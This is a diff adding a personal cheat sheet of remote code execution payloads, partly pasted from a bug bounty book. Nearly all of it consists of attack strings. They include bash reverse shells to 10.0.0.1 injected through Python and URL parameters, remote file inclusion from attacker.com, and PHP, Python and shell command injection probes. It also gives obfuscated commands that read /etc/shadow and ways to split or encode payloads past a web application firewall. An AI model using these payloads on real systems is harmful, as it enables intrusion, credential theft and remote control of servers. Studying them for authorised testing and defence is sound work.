@@ -1,0 +1,83 @@
+Remote code execution (RCE) occurs when an attacker can execute arbitrary code on a
+target machine because of a vulnerability or misconfiguration.
+It can be achived through a sqli, ssti, insecure deserializtaion tec
+
+Code injection
+GET /calculator?calc="__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
+Host: example.com
+
+GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+Host: example.com
+
+File Inclusion
+http://example.com/?page=http://attacker.com/malicious.php?cmd=ls
+
+Python payloads for rce
+This command is designed to print the string RCE test! if Python execu-
+tion succeeds:
+print("RCE test!")
+
+This command prints the result of the system command ls:
+"__import__('os').system('ls')"
+
+This command delays the response for 10 seconds:
+"__import__('os').system('sleep 10')
+
+PHP payloads for rce
+This command is designed to print the local PHP configuration infor-
+mation if execution succeeds:
+phpinfo();
+This command prints the result of the system command ls:
+<?php system("ls");?>
+This command delays the response for 10 seconds:
+<?php system("sleep 10");?>
+
+Unix payloads
+This command prints the result of the system command ls:
+;ls;
+These commands delay the response for 10 seconds:
+| sleep 10;
+& sleep 10;
+` sleep 10;`
+$(sleep 10)
+
+Bypasses
+cat /etc/shadow
+cat "/e"tc'/shadow'
+cat /etc/sh*dow
+cat /etc/sha``dow
+cat /etc/sha$()dow
+cat /etc/sha${}dow
+
+PHP
+the following example executes a system command by concatenating
+the strings sys and tem:
+('sys'.'tem')('cat /etc/shadow');
+
+system/**/('ls');
+
+Similar behavior exists in Python. The following are all equivalent in
+Python syntax:
+__import__('os').system('cat /etc/shadow')
+__import__('o'+'s').system('cat /etc/shadow')
+__import__('\x6f\x73').system('cat /etc/shadow')
+
+Splitting response
+GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
+Host: example.com
+
+Remote Code Execution 293
+malicious code into chunks to bypass input validation. For example, if the
+firewall blocks requests that contain the string system, you can split your
+RCE payload into chunks, like so:
+GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
+Host: example.com
+
+The parameters will get through the firewall without issue, since the request technically doesn’t contain the string system. But when the server
+processes the request, the parameter values will be concatenated into a single string that forms our RCE payload: "__import__('os').system('ls')".
+This is only a tiny subset of filter bypasses you can try; many more exist. For example, you can hex-encode, URL-encode, double-URL-encode, and
+vary the cases (uppercase or lowercase characters) of your payloads. You can also try to insert special characters such as null bytes, newline charac-
+ters, escape characters (\), and other special or non-ASCII characters into the payload. Then, observe which payloads are blocked and which ones succeed, and craft exploits that will bypass the filter to accomplish your desired
+results. If you’re interested in this topic, search online for RCE filter bypass or WAF bypass to learn more. Additionally, the principles mentioned in this
+section can be used to bypass input validation for other vulnerabilities as
+well, such as SQL injection and XSS.
